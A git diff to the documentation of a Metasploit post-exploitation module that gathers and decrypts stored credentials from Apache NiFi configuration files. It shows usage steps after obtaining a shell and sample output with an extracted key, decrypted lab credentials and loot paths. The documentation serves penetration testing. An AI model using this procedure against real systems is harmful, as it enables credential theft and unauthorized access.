@@ -15,7 +15,7 @@ in the `conf` folder:
 
 ### authorizers.xml
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 
 <authorizers>
@@ -72,7 +72,7 @@ in the `conf` folder:
 
 ### login-identity-providers.xml
 
-```
+```xml
 <loginIdentityProviders>
     <!--
         Generated with: ./nifi.sh set-single-user-credentials USERNAME PASSWORDPASSWORD
@@ -88,7 +88,7 @@ in the `conf` folder:
 
 ### nifi.properties
 
-```
+```ini
 # Core Properties #
 nifi.flow.configuration.file=./conf/flow.xml.gz
 nifi.flow.configuration.json.file=./conf/flow.json.gz
@@ -415,9 +415,9 @@ rQcAAA==
 1. Get a shell on the NiFi system with permission to read the conf files
 1. Do: `use linux/gather/nifi_credentials`
 1. Do: `set session [#]`
-2. Do: `set NIFI_PATH [path]` or `NIFI_PROPERTIES`, `NIFI_FLOW_JSON`, `NIFI_IDENTITY`, and `NIFI_AUTHORIZERS`
-3. Do: `run`
-4. You should get any credentials stored by the system
+1. Do: `set NIFI_PATH [path]` or `NIFI_PROPERTIES`, `NIFI_FLOW_JSON`, `NIFI_IDENTITY`, and `NIFI_AUTHORIZERS`
+1. Do: `run`
+1. You should get any credentials stored by the system
 
 ## Options
 
@@ -455,15 +455,15 @@ NiFi authorizers file (`authorizers.xml`), if not found in `NIFI_PATH`. Defaults
 [-] /opt/nifi/conf/nifi.properties not found
 [*] Found nifi.properties file /opt/nifi-1.23.2/nifi-1.23.2//conf/nifi.properties
 [+] /opt/nifi-1.23.2/nifi-1.23.2//conf/nifi.properties is readable!
-[+] properties data saved in: /home/h00die/.msf4/loot/20231101154955_default_192.168.2.243_nifi.properties_940319.txt
+[+] properties data saved in: /home/h00die/.msf4/loot/20231106144709_default_192.168.2.243_nifi.properties_402421.txt
 [+] Key: pVTBP82AE+ter4iTwZQK7IoYwljtRDVw
-[+] Encrypted data saved in: /home/h00die/.msf4/loot/20231101154956_default_192.168.2.243_nifi.flow.json_646239.json
+[+] Encrypted data saved in: /home/h00die/.msf4/loot/20231106144711_default_192.168.2.243_nifi.flow.json_650473.json
 [*] Checking root group processors
-[*] Nonce: 77a0d0128f0ee84b6c8775c11375fba3
-[*] Auth Tag: 3ca3d98ed07b8e9500078ae9a2cce3bb
-[*] Ciphertext: 068f1260adabb388db351051
+[*]   Analyzing  of type org.apache.nifi.processors.standard.GetHTTP
+[*]     Decryption initiated for AES-256-GCM
+[*]       Nonce: 77a0d0128f0ee84b6c8775c11375fba3, Auth Tag: 3ca3d98ed07b8e9500078ae9a2cce3bb, Ciphertext: 068f1260adabb388db351051
 [*] Checking root group controller services
-[+] Decrypted data saved in: /home/h00die/.msf4/loot/20231101154957_default_192.168.2.243_nifi.flow.decryp_004372.json
+[+] Decrypted data saved in: /home/h00die/.msf4/loot/20231106144711_default_192.168.2.243_nifi.flow.decryp_491289.json
 [*] Checking identity file
 [-] /opt/nifi/conf/login-identity-providers.xml not found
 [*] Found login-identity-providers.xml file /opt/nifi-1.23.2/nifi-1.23.2//conf/login-identity-providers.xml
@@ -476,12 +476,11 @@ NiFi authorizers file (`authorizers.xml`), if not found in `NIFI_PATH`. Defaults
 NiFi Flow Data
 ==============
 
- Name                     Username                                                                         Password                                                      Information
- ----                     --------                                                                         --------                                                      -----------
- ThisIsACustomName        testusername                                                                     testpassword                                                  http://127.0.0.1
+ Name                     Username                                                                         Password                                                      Other Information
+ ----                     --------                                                                         --------                                                      -----------------
+ ThisIsACustomName        testusername                                                                     testpassword                                                  URL: http://127.0.0.1
  aad-user-group-provider  Directory/Tenant ID: YOUR_TENANT_ID, Application ID: YOUR_APPLICATION_CLIENT_ID  YOUR_APPLICATION_CLIENT_SECRET                                From authorizers.xml
  single-user-provider     USERNAME                                                                         $2b$12$53nHe2KpVIvWUVwaZft/1.2zOoSxfBkl4pIOXaIoC0QisaYJIZQBe  From login-identity-providers.xml
 
 [*] Post module execution completed
-[msf](Jobs:0 Agents:1) post(linux/gather/nifi_credentials) >
 ```
